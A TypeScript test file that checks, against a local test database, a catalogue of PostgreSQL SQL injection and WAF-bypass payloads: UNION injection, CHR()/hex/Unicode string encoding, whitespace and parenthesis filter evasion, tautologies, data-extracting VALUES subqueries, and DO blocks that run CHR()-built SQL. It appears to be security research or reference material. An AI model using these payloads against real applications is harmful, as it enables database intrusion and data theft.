/**
 * PostgreSQL Fuzzing and Obfuscation Tests
 *
 * @kb-coverage postgresql/fuzzing-obfuscation - Full coverage
 */

import { describe, test, expect, beforeAll, afterAll } from "vitest";
import {
  initDirectRunner,
  cleanupDirectRunner,
  directSQLExpectSuccess,
  directSQL,
} from "../../src/runner/direct.js";
import { logger } from "../../src/utils/logger.js";

describe("PostgreSQL Fuzzing and Obfuscation", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupDirectRunner();
  }, 10000);

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Comment Variations
   */
  describe("Comment variations", () => {
    test("Line comment (--)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 -- this is a comment"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Block comment (/* */)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users /* comment */ WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Inline comments for obfuscation", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT/*comment*/username/**/FROM/**/users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Nested comments", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT /* outer /* nested */ comment */ username FROM users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Dollar Quote Obfuscation
   */
  describe("Dollar quote obfuscation", () => {
    test("Standard dollar quotes bypass single quote filters", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username = $$admin$$"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Tagged dollar quotes", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username = $x$admin$x$"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Dollar quotes in UNION injection", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, $$injected$$"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("injected");
    });

    test("Unicode letters in dollar quote tags (Greek)", async () => {
      // PostgreSQL allows Unicode letters in tags (follows identifier rules)
      const { rows } = await directSQLExpectSuccess("SELECT $α$admin$α$ as val");
      expect((rows[0] as { val: string }).val).toBe("admin");
    });

    test("Unicode letters in dollar quote tags (Japanese)", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT $日$admin$日$ as val");
      expect((rows[0] as { val: string }).val).toBe("admin");
    });

    test("Unicode letters in dollar quote tags (emoji)", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT $💀$admin$💀$ as val");
      expect((rows[0] as { val: string }).val).toBe("admin");
    });

    test("Tag starting with digit fails", async () => {
      // Tags follow identifier rules - cannot start with digit
      const { success } = await directSQL("SELECT $1tag$admin$1tag$ as val");
      expect(success).toBe(false);
    });

    test("Tag with underscore prefix works", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT $_tag$admin$_tag$ as val");
      expect((rows[0] as { val: string }).val).toBe("admin");
    });

    test("Tags are case-sensitive", async () => {
      // $Tag$ != $tag$ - must match exactly
      const { success } = await directSQL("SELECT $Tag$admin$tag$ as val");
      expect(success).toBe(false);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Case Variation
   */
  describe("Case variation", () => {
    test("Lowercase keywords", async () => {
      const { rows } = await directSQLExpectSuccess("select username from users where id = 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Uppercase keywords", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT USERNAME FROM USERS WHERE ID = 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Mixed case keywords", async () => {
      const { rows } = await directSQLExpectSuccess("SeLeCt UsErNaMe FrOm UsErS wHeRe Id = 1");
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section String Representation Alternatives
   */
  describe("String representation alternatives", () => {
    test("CHR() function avoids quotes", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("convert_from with bytea hex", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username = convert_from('\\x61646d696e'::bytea, 'UTF8')"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Escape string syntax", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT E'\\x61\\x64\\x6d\\x69\\x6e' as str");
      expect((rows[0] as { str: string }).str).toBe("admin");
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Numeric Representation
   */
  describe("Numeric representation", () => {
    test("Mathematical expression for number", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = 2-1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Cast from string", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = '1'::int");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Boolean to int conversion", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = true::int");
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Function Call Variations
   */
  describe("Function call variations", () => {
    test("SUBSTRING standard syntax", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT SUBSTRING('admin', 1, 3) as sub");
      expect((rows[0] as { sub: string }).sub).toBe("adm");
    });

    test("SUBSTRING FROM/FOR syntax", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT SUBSTRING('admin' FROM 1 FOR 3) as sub"
      );
      expect((rows[0] as { sub: string }).sub).toBe("adm");
    });

    test("SUBSTR alternative", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT SUBSTR('admin', 1, 3) as sub");
      expect((rows[0] as { sub: string }).sub).toBe("adm");
    });

    test("LEFT function alternative", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT LEFT('admin', 3) as sub");
      expect((rows[0] as { sub: string }).sub).toBe("adm");
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section UNION Query Obfuscation
   */
  describe("UNION query obfuscation", () => {
    test("UNION ALL avoids DISTINCT", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION ALL SELECT 1, 'test'"
      );
      expect(rows.length).toBeGreaterThan(1);
    });

    test("UNION with redundant conditions", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE 1=1 AND id = 1 UNION SELECT 999, 'test' WHERE 1=1"
      );
      expect(rows.length).toBeGreaterThan(1);
    });

    test("Nested UNION query", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM (SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, 'test') AS t"
      );
      expect(rows.length).toBeGreaterThan(1);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Keyword Splitting Limitations
   *
   * Note: Unlike MySQL, PostgreSQL does NOT support splitting keywords with comments.
   * SEL[comment]ECT does NOT work in PostgreSQL - keywords must be intact.
   */
  describe("Keyword splitting limitations (PostgreSQL vs MySQL)", () => {
    test("PostgreSQL requires intact keywords (no splitting)", async () => {
      // Unlike MySQL, PostgreSQL doesn't allow SEL/**/ECT
      // This test verifies that keywords work when intact
      const { rows } = await directSQLExpectSuccess(
        "SELECT/**/ username /**/FROM/**/ users WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Comments between keywords work (not within)", async () => {
      // Comments BETWEEN keywords work, but not WITHIN keywords
      const { rows } = await directSQLExpectSuccess(
        "SELECT /**/ id, /**/ username /**/ FROM /**/ users /**/ WHERE id = 1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Alternative SQL Constructs
   */
  describe("Alternative SQL constructs", () => {
    test("OR true instead of OR 1=1", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = 999 OR true");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("OR NOT false", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR NOT false"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Boolean cast in condition", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR 1::boolean"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section PostgreSQL-Specific Bypasses
   */
  describe("PostgreSQL-specific bypasses", () => {
    test("Array contains operator", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE ARRAY[id] @> ARRAY[1]"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("ANY with array", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = ANY('{1,2,3}'::int[])"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Regex operator instead of LIKE", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username ~ '^admin'"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Case-insensitive regex", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username ~* 'ADMIN'"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Using Subqueries
   */
  describe("Using subqueries", () => {
    test("Subquery in WHERE clause", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = (SELECT 1)");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("WITH clause (CTE)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "WITH t AS (SELECT 1 AS id) SELECT * FROM users, t WHERE users.id = t.id"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("EXISTS subquery", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users u WHERE EXISTS (SELECT 1 WHERE u.id = 1)"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Space Bypass Between UNION and SELECT
   *
   * Lesser-known techniques to bypass space filtering between UNION and SELECT.
   * These are alternatives to the well-known UNION-comment-SELECT pattern.
   */
  describe("Space bypass between UNION and SELECT", () => {
    test("Tab character (\\t) as separator", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\tSELECT 999, 'tab_bypass'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("tab_bypass");
    });

    test("Newline (\\n) as separator", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\nSELECT 999, 'newline_bypass'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("newline_bypass");
    });

    test("Carriage return + newline (\\r\\n) as separator", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\r\nSELECT 999, 'crlf_bypass'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("crlf_bypass");
    });

    test("Form feed (\\f) as separator", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\fSELECT 999, 'formfeed_bypass'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("formfeed_bypass");
    });

    test("Vertical tab (\\v) does NOT work as separator", async () => {
      // Unlike other whitespace, vertical tab (0x0B) is NOT valid in PostgreSQL
      const { success } = await directSQL(
        "SELECT id, username FROM users WHERE id = 1 UNION\vSELECT 999, 'vtab_bypass'"
      );
      expect(success).toBe(false);
    });

    test("Parentheses around SELECT (no space needed)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT 999, 'paren_bypass')"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("paren_bypass");
    });

    test("VALUES clause (avoids SELECT keyword entirely)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION VALUES(999, 'values_bypass')"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("values_bypass");
    });

    test("UNION ALL with parentheses (no space)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION ALL(SELECT 999, 'unionall_paren')"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("unionall_paren");
    });

    test("Multiple mixed whitespace characters", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION\n\t\r\nSELECT 999, 'mixed_ws'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("mixed_ws");
    });

    test("Double parentheses around SELECT", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'double_paren'))"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("double_paren");
    });

    test("Subquery with parentheses (bypasses UNION SELECT pattern)", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT * FROM(SELECT 999, 'subq_bypass')t)"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("subq_bypass");
    });

    test("VALUES with multiple rows", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION VALUES(998, 'val1'),(999, 'val2')"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("val1");
      expect(usernames).toContain("val2");
    });

    test("Plus sign after UNION (PostgreSQL specific)", async () => {
      // In some contexts, UNION+SELECT might work differently
      // Testing UNION followed by expression in parentheses
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT+999, 'plus_bypass')"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("plus_bypass");
    });

    test("VALUES with subquery to extract data from table", async () => {
      // VALUES can use subqueries to extract actual table data!
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION VALUES(999, (SELECT username FROM users WHERE id = 2))"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      // Should contain the username from user id=2
      expect(usernames.length).toBeGreaterThan(1);
    });

    test("VALUES with multiple subqueries", async () => {
      // Both columns can be subqueries
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION VALUES((SELECT id FROM users WHERE username='admin'), (SELECT username FROM users WHERE id = 2))"
      );
      expect(rows.length).toBeGreaterThan(1);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section DO $$ Block WAF Bypass
   */
  describe("DO $$ Block WAF Bypass", () => {
    test("Execute basic DO block", async () => {
      // Basic anonymous block execution
      const { success } = await directSQL("DO $$ BEGIN RAISE NOTICE 'test'; END $$");
      expect(success).toBe(true);
    });

    test("Execute dynamic SQL in DO block", async () => {
      // Logic that might bypass WAFs by hiding keywords
      const { success } = await directSQL(`
        DO $$
        DECLARE
          ver text;
        BEGIN
          EXECUTE 'SELECT version()' INTO ver;
          -- We can't easily return data from DO block to client without side channels
          -- but success indicates the code ran
        END $$;
      `);
      expect(success).toBe(true);
    });

    test("Construct commands with CHR() in DO block", async () => {
      const { success } = await directSQL(`
        DO $$
        DECLARE
          cmd text;
        BEGIN
          -- Construct 'SELECT 1' via CHR
          cmd := CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||' 1';
          EXECUTE cmd;
        END $$;
      `);
      expect(success).toBe(true);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section String Representation Alternatives - Extended
   */
  describe("String representation alternatives - extended", () => {
    test("Escape string octal syntax", async () => {
      // E'\141\144\155\151\156' = 'admin' in octal
      const { rows } = await directSQLExpectSuccess("SELECT E'\\141\\144\\155\\151\\156' as str");
      expect((rows[0] as { str: string }).str).toBe("admin");
    });

    test("Unicode escape syntax", async () => {
      // U&'\0061\0064\006D\0069\006E' = 'admin'
      const { rows } = await directSQLExpectSuccess(
        "SELECT U&'\\0061\\0064\\006D\\0069\\006E' as str"
      );
      expect((rows[0] as { str: string }).str).toBe("admin");
    });

    test("Custom UESCAPE character", async () => {
      // Use ! instead of backslash as escape character
      const { rows } = await directSQLExpectSuccess("SELECT U&'!0061dmin' UESCAPE '!' as str");
      expect((rows[0] as { str: string }).str).toBe("admin");
    });

    test("convert_from in WHERE clause", async () => {
      // Using convert_from with hex in injection context
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username = convert_from('\\x61646d696e'::bytea, 'UTF8')"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Combined encoding techniques", async () => {
      // Mix hex and chr
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE username = convert_from('\\x61'::bytea, 'UTF8') || CHR(100)||CHR(109)||CHR(105)||CHR(110)"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Numeric Representation - Extended
   */
  describe("Numeric representation - extended", () => {
    test("Scientific notation 1e0", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = 1e0");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Scientific notation 0.1e1", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = 0.1e1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Scientific notation with UNION", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 0e0 UNION SELECT 999, 'scientific'"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("scientific");
    });

    test("Type constructor function int4()", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = int4('1')");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("ABS() for number generation", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = ABS(-1)");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("LENGTH() for number generation", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = LENGTH('x')");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("ASCII() arithmetic for number", async () => {
      // ASCII('1') = 49, so ASCII('1') - 48 = 1
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = ASCII('1') - 48"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Boolean Representation Bypasses
   */
  describe("Boolean representation bypasses", () => {
    test("'yes'::boolean for true", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR 'yes'::boolean"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("'on'::boolean for true", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR 'on'::boolean"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("'t'::boolean for true", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR 't'::boolean"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("'no'::boolean for false", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT 'no'::boolean as val");
      expect((rows[0] as { val: boolean }).val).toBe(false);
    });

    test("'off'::boolean for false", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT 'off'::boolean as val");
      expect((rows[0] as { val: boolean }).val).toBe(false);
    });

    test("BOOL 't' syntax", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 999 OR BOOL 't'"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Pattern Matching Alternatives
   */
  describe("Pattern matching alternatives", () => {
    test("STRPOS instead of LIKE", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE STRPOS(username, 'admin') > 0"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("starts-with operator (^@) for PG11+", async () => {
      // ^@ is a starts-with operator added in PostgreSQL 11
      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE username ^@ 'adm'");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("POSITION alternative to STRPOS", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE POSITION('admin' IN username) > 0"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Schema-Qualified Functions
   */
  describe("Schema-qualified functions for bypass", () => {
    test("pg_catalog.length() bypass", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE pg_catalog.length(username) > 0"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("pg_catalog.upper() bypass", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE pg_catalog.upper(username) = 'ADMIN'"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("pg_catalog.substr() bypass", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM users WHERE pg_catalog.substr(username, 1, 1) = 'a'"
      );
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section CHR() Helper Functions
   */
  describe("CHR() encoding helpers", () => {
    test("Generate CHR() sequence for string", async () => {
      // Helper query to convert any string to CHR() sequence
      const { rows } = await directSQLExpectSuccess(`
        SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
        FROM regexp_split_to_table('SELECT', '') AS ch
      `);
      const chrSequence = (rows[0] as { string_agg: string }).string_agg;
      expect(chrSequence).toBe("CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)");
    });

    test("Execute CHR()-constructed keyword", async () => {
      // Verify the CHR sequence actually works
      const { rows } = await directSQLExpectSuccess(
        "SELECT CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84) as keyword"
      );
      expect((rows[0] as { keyword: string }).keyword).toBe("SELECT");
    });

    test("CHR() sequence for UNION keyword", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
        FROM regexp_split_to_table('UNION', '') AS ch
      `);
      const chrSequence = (rows[0] as { string_agg: string }).string_agg;
      expect(chrSequence).toBe("CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)");
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Characters After SELECT Without Space
   */
  describe("Characters after SELECT without space", () => {
    test("Quote directly after SELECT", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT'test' as val");
      expect((rows[0] as { val: string }).val).toBe("test");
    });

    test("Dot after SELECT (decimal number)", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT.1e1 as val");
      // Driver may return as string; check numeric value
      expect(Number((rows[0] as { val: string | number }).val)).toBe(1);
    });

    test("Minus after SELECT (unary)", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT-1 as val");
      expect((rows[0] as { val: number }).val).toBe(-1);
    });

    test("Plus after SELECT (unary)", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT+1 as val");
      expect((rows[0] as { val: number }).val).toBe(1);
    });

    test("Parentheses after SELECT", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT(1+1) as val");
      expect((rows[0] as { val: number }).val).toBe(2);
    });

    test("At sign after SELECT (absolute value)", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT@(-5) as val");
      expect((rows[0] as { val: number }).val).toBe(5);
    });
  });

  /**
   * @kb-entry postgresql/fuzzing-obfuscation
   * @kb-section Parentheses as Space Alternative
   */
  describe("Parentheses as space alternative", () => {
    test("SELECT(column)FROM pattern", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT(username)FROM users WHERE id = 1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Nested parentheses in UNION", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'nested'))"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("nested");
    });

    test("SELECT * FROM (SELECT ...) pattern", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT * FROM(SELECT 999, 'from_subq')t)"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("from_subq");
    });
  });
});
